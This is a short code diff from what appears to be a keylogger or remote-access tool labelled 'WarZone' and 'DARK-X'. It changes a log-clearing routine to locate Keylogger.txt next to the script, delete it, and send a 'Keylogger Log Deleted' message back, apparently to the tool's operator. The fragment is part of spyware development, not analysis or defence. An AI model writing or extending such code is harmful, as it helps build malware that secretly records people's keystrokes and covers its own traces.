@@ -5,7 +5,8 @@ class Clear_Log():
 		self.Main()
 
 	def Main(self):
-		filename = r"C:\Users\Public\WarZone\DARK-X\Keylogger.txt"
+		dirname = "\\".join(os.path.abspath(__file__).split("\\")[:-1])
+		filename = dirname + "\Keylogger.txt"
 		if os.path.exists(filename):
 			os.remove(filename)
 			self.Send_Message.Send("%E2%9C%94%EF%B8%8F Keylogger Log Deleted")
